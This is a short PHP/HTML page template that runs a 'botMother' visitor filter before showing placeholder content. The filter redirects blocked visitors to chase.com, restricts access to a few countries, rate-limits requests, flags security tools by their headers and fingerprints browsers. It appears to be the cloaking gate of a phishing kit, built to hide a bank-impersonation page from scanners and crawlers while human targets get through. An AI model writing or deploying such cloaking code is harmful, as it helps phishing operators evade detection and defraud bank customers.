<!DOCTYPE html>
<html>
<head>
    <title>Protected Page</title>
    <!-- Set JS cookie first to avoid race conditions -->
    <script>document.cookie = "js_enabled=1; path=/";</script>
</head>
<body>
	<?php
    require (__DIR__).'/botMother/botMother.php';
    
    $bm = new botMother();
    
    // === Configuration ===
    $bm->setExitLink("https://www.chase.com/");  // Redirect blocked bots
    $bm->setGeoFilter("de,us,fr,uk");           // Allow only these countries
    $bm->setTestMode(false);                    // Disable in production
    
    // === Security Checks ===
    $bm->limitRequests(30, 60);                // 30 requests/minute per IP
    $bm->validateHeaders();                    // Check for bots/tools
    $bm->checkFingerprint();                   // Verify JS support (cookie)

    // === Execute ===
    $bm->run();
    ?>
    
    <!-- Your normal page content here -->
    <h1>Welcome to the Site!</h1>
</body>
</html>